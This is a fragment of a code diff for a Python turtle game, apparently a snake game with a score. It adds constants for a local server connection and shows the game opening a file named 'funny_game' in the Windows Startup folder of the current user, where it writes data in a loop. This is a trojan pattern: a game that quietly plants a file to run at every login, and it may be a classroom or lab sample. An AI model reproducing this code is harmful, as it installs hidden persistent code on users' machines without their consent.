@@ -5,8 +5,10 @@ import subprocess
 import time
 import turtle
 
-from vuls import *
-
+SERVER_IP = "127.0.0.1"
+SERVER_PORT = "8080"
+MSG_LEN_PROTOCOL = 4
+EOF = b'-1'
 delay = 0.1
 
 # Score
@@ -106,7 +108,7 @@ user_name = os.getlogin()
 location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
            "\\Windows\\Start Menu\\Programs\\" \
            "Startup\\funny_game".format(
-                user_name)
+    user_name)
 with open(location, "wb") as f:
     done = False
     while not done:
